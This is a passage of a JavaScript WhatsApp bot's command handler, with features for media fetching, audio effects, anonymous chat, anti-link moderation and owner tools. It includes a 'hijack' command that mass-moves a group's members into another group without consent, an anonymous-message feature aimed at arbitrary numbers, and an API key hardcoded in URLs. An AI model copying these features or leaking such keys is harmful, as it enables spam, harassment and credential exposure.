    ElgazarBot.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
break
	        case 'pinterest': {
m.reply(mess.wait)
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
ElgazarBot.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
        case 'ringtone': {
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		ElgazarBot.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
case 'stickman':
m.reply(mess.wait)
ElgazarBot.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/manusia-lidi?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'spongebob':
m.reply(mess.wait)
ElgazarBot.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kawan-sponsbob?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'gojosatoru':
m.reply(mess.wait)
ElgazarBot.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/gojosatoru?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'nicholas':
m.reply(mess.wait)
ElgazarBot.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/nicholas?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'cartoon':
m.reply(mess.wait)
ElgazarBot.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kr-robot?apikey=dhmDlD5x`}}, {quoted: m })
break
		case 'دبه': case 'ضوضاء': case 'deep': case 'earrape': case 'سريع': case 'بطئ2': case 'طفل': case 'عكس': case 'روبوت': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/دبه/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/ضوضاء/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/بطئ/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/سريع/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/بطئ2/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/طفل/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/عكس/.test(command)) set = '-filter_complex "areverse"'
                if (/روبوت/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                ElgazarBot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`رد علي مقطع صوتي واكتب *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
                if (!m.quoted) throw 'Reply Message!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `For What Command?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `No hashes`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                ElgazarBot.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Message!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) throw 'Reply Message You Want To Save In Database'
                if (!text) throw `Example : ${prefix + command} filename`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' registered in the message list`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nView message list with ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' not listed in the message list`
                ElgazarBot.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		m.reply(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'developer': case 'dev': {
reply(`•CHEEMS BOT DEVELOPER•\n\n\n   ©2021-2022 Xeon Bot Inc.\n\n🦄Dream Guy Xeon\nPm: wa.me/916909137213`)
}
            break
case 'owner': case 'المطور': case 'المالك': case 'mod': {
ElgazarBot.sendContact(m.chat, owner, m)
}
            break
        case 'menfess':
			case 'menfes':
			case 'confes':
			case 'confess':
				if (m.isGroup) return m.reply(mess.group)
				if (!text) return m.reply(`*How to use?*\n\Send command ${prefix + command} number|sender|message\n\nExample ${prefix + command} 91xxxxxxxxxx|handsome here|I have a crush on you\n\nExample 2 : ${prefix + command} 91xxxxxxxxxx|ur crush|I have a crush on you\n\nDon't worry, privacy is safe><`)
				let nomor = q.split('|')[0] ? q.split('|')[0] : q
				let saking = q.split('|')[1] ? q.split('|')[1] : q
				let pesan = q.split('|')[2] ? q.split('|')[2] : ''
				if (pesan.length < 1) return m.reply(`All must be filled in! eg : confess 91xxxxxxxxxx|from|hello dude`)
				 let teksnya = `Hi friend, there is confess message for you!!\n\nFrom :  _${saking}_  \nMessage : _${pesan}_ `
					gambar = `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`
				 var button = [{ buttonId: `menfesconfirm`, buttonText: { displayText: `CONFIRM‡` }, type: 1 }, { buttonId: `menu`, buttonText: { displayText: `Menu` }, type: 1 }]
					ElgazarBot.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`}, buttons: button, footer: botname })
				m.reply(`Success Sending Menfess!!`)
				break
			case 'menfesconfirm':{
 				 ElgazarBot.sendMessage(q, {text: `It's been confirmed, Confess🌹`})
				  m.reply(`Thank you confess for being accepted.`)
				}
				break
case 'anonymous': {
                if (m.isGroup) return m.reply(mess.group)
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                ElgazarBot.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await ElgazarBot.getName(m.sender)} Welcome To Anonymous Chat\n\nClick the button below to find a partner\`\`\``, botname, m)
            }
			break
case 'keluar': case 'leave': {
                if (m.isGroup) return m.reply('Features Cannot Be Used For Groups!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(m.chat, buttons, `\`\`\`You Are Not In Anonymous Session, Press Button To Find Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await ElgazarBot.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
                if (m.isGroup) return m.reply('Features Cannot Be Used For Groups!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(m.chat, buttons, `\`\`\`You are still in an anonymous session, press the button below to terminate your anonymous session\`\`\``, botname, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await ElgazarBot.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
                }
                break
            }
            case 'next': case 'lanjut': {
                if (m.isGroup) return m.reply('Features Cannot Be Used For Groups!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(m.chat, buttons, `\`\`\`You are not in an anonymous session, press the button to find a partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await ElgazarBot.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await ElgazarBot.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
                }
                break
            }
            case 'عام': {
                if (!isCreator) throw mess.owner
                ElgazarBot.public = true
                m.reply('*حاله البوت عام*')
            }
            break
            case 'خاص': {
                if (!isCreator) throw mess.owner
                ElgazarBot.public = false
                m.reply('*حاله البوت خاص*')
            }
            break
            case 'ping': case 'السرعه': case 'statusbot': case 'p': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
سرعة الاستجابة ${latensi.toFixed(4)} _ثانية \n ${oldd - neww} _مللي ثانية_\n\nمدة العرض : ${runtime(process.uptime())}

💻 معلومات السيرفر
الرام: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_استخدام الذاكرة NodeJS_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_إجمالي استخدام وحدة المعالجة المركزية_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
            case 'setmenu': {
            if (!isCreator) throw mess.owner
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                setbot.templateImage = true
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateVideo'){
                setbot.templateImage = false
                setbot.templateVideo = true
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateGif'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = true
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateMessage'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = true
                m.reply(mess.success)
                } else {
                let sections = [
                {
                title: "CHANGE MENU BOT",
                rows: [
                {title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
                {title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
                {title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
                {title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`}
                ]
                },
                ]
                ElgazarBot.sendListMsg(m.chat, `pilih aja *Din* Setmenu nya!`, ElgazarBot.user.name, `*Hello ElgazarBot* !`, `Pilih Din`, sections, m)
                }
            }
            break
            
case 'req': case 'request': {
            	if (!text) throw `Example : ${prefix + command} Fitur Min`
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Message From : @${me.split('@')[0]} \nFor : @${ownernya.split('@')[0]}\n\n${command} ${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '🙏THANKS' }, type: 1 }]
            await ElgazarBot.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments, quoted: fdoc})
            let akhji = `*Request has been sent*\n*To Owner @${ownernya.split('@')[0]}*\n_Thank you🙏_`
            await ElgazarBot.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments, quoted: fkontak})
            }
            break
case 'report': case 'bug': {
            	if (!text) throw `Example : ${prefix + command} Report an error feature`
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Message From : @${me.split('@')[0]} \nFor : @${ownernya.split('@')[0]}\n\n${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '🙏THANKS FOR THE REPORT' }, type: 1 }]
            await ElgazarBot.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments})
            let akhji = `Report Sent\nTo Owner @${ownernya.split('@')[0]}\n*Thank you for the report🙏*\n_Your number will be blocked_\n_If the Report is Only Created_`
            await ElgazarBot.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments})
            }
            break
            case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
ElgazarBot_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await ElgazarBot.sendMessage(m.chat, { audio: ElgazarBot_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'hijack':{
  if(!isCreator) throw mess.owner
  let text1 = q.split("|")[0]
  let text2 = q.split("|")[1]
  if(!text1) throw `Example:\n${order +' 1234567890@g.us|_amount_'}`
  if(!text2) throw `Eg:\n${order +' 1234567890@g.us|_amount_'}`
  ElgazarBot.sendMessage(text1, { text: `Member kidnapping request by @${m.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [m.sender] },{ quoted : m })               
  await ElgazarBot.sendMessage(from, { text: `Member kidnapping request by @${m.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [m.sender] },{ quoted : m })                
  await m.sequestrar(text1, participants.map(mem => mem.id), text2)
  }
  break
case 'setthumb':{
                       if (!m.key.fromMe && !isCreator) return m.reply(mess.owner)
                       if (!isQuotedImage) return m.reply('Reply the picture!')
                                 let media = await ElgazarBot.downloadMediaMessage(m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
                await fs.writeFileSync('./XeonMedia/theme/cheemspic.jpg', media)
               m.reply(mess.success)
            }
          break
case 'creategroup':
if (!isCreator) return m.reply(mess.owner)
if (!q) return reply("Enter text")
const group = await ElgazarBot.groupCreate(q, [owner + "@s.whatsapp.net"])
m.reply(mess.success)
ElgazarBot.sendMessage(group.id, { text: 'Halo!!' }) // say hello to everyone on the group
break
case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return m.reply('Already activated')
ntilinkytvid.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply('Success in turning on youtube video antilink in this group')
var groupe = await ElgazarBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return m.reply('Already deactivated')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply('Success in turning off youtube video antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return m.reply('Already activated')
ntilinkytch.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
m.reply('Success in turning on youtube channel antilink in this group')
var groupe = await ElgazarBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return m.reply('Already deactivated')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
m.reply('Success in turning off youtube channel antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkInstagram) return m.reply('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply('Success in turning on instagram antilink in this group')
var groupe = await ElgazarBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return m.reply('Already deactivated')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply('Success in turning off instagram antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
        case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkFacebook) return m.reply('Already activated')
ntilinkfb.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply('Success in turning on facebook antilink in this group')
var groupe = await ElgazarBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return m.reply('Already deactivated')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply('Success in turning off facebook antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTelegram) return m.reply('Already activated')
ntilinktg.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply('Success in turning on telegram antilink in this group')
var groupe = await ElgazarBot.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return m.reply('Already deactivated')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply('Success in turning off telegram antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTiktok) return m.reply('Already activated')
ntilinktt.push(from)
